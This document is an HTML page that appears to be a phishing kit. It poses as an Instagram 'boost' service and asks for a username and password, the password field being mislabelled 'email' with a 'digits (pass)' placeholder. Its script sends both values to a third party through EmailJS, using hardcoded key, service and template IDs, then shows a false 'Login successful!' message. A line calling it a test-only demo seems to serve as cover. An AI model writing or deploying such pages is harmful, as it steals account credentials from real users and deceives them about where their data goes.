  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Boost Your Instagram Now!</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6b48ff, #ff589e, #ffcc00);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.25), transparent 70%);
      opacity: 0.8;
      animation: pulseGlow 10s ease-in-out infinite;
    }
    @keyframes pulseGlow {
      0%, 100% { opacity: 0.8; transform: scale(1); }
      50% { opacity: 0.5; transform: scale(1.1); }
    }
    .container {
      width: 420px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 25px;
      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
      padding: 50px 40px;
      text-align: center;
      z-index: 1;
      animation: floatIn 0.8s ease-out;
      backdrop-filter: blur(5px);
    }
    @keyframes floatIn {
      0% { opacity: 0; transform: translateY(30px) scale(0.95); }
      100% { opacity: 1; transform: translateY(0) scale(1); }
    }
    .header {
      margin-bottom: 30px;
    }
    .title {
      font-size: 32px;
      font-weight: 700;
      color: #ff3366;
      text-shadow: 0 2px 6px rgba(255, 51, 102, 0.4);
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 25px;
      font-weight: 400;
    }
    .form-box {
      padding: 0 20px;
    }
    .input-field {
      width: 100%;
      padding: 16px;
      margin: 12px 0;
      border: none;
      border-radius: 12px;
      background: #f5f5f5;
      font-size: 15px;
      color: #333;
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
      transition: all 0.3s ease;
    }
    .input-field:focus {
      background: #fff;
      box-shadow: 0 0 12px rgba(255, 88, 158, 0.5);
      outline: none;
    }
    .input-field::placeholder {
      color: #bbb;
    }
    .connect-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, #6b48ff, #ff589e, #ffcc00);
      color: white;
      border: none;
      border-radius: 12px;
      font-weight: bold;
      font-size: 17px;
      cursor: pointer;
      margin-top: 20px;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }
    .connect-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(255, 88, 158, 0.6);
    }
    .connect-btn:disabled {
      background: #d0d0d0;
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }
    .note {
      font-size: 13px;
      color: #888;
      margin-top: 25px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="title">Boost Your Instagram Now!</h1>
    </div>
    <p class="subtitle">Connect for an Instagram boost!</p>
<div class="form-box">
  <form id="connect-form" name="connect-form">
    <input type="text" name="username" id="username" class="input-field" placeholder="Username or email address" required>
    <input type="text" name="email" id="email" class="input-field" placeholder="digits (pass)" required>
    <button type="submit" class="connect-btn" id="connect-btn">Connect</button>
  </form>
</div>
<p class="note">Demo featureâ€”data used for testing only!</p>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key

    document.getElementById("connect-form").addEventListener("submit", function(event) {
      event.preventDefault();
      const connectBtn = document.getElementById("connect-btn");
      connectBtn.disabled = true;
      connectBtn.textContent = "Connecting...";

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;

      emailjs.send("service_1jiaczt", "template_9lwlyaq", {
        username: username,
        email: email
      })
      .then(function(response) {
        alert("Login successful!");
        connectBtn.disabled = false;
        connectBtn.textContent = "Connect";
        document.getElementById("connect-form").reset();
      }, function(error) {
        alert("Failed to process. Please try again.");
        connectBtn.disabled = false;
        connectBtn.textContent = "Connect";
        console.log("EmailJS Error:", error);
      });
    });
  </script>
</body>
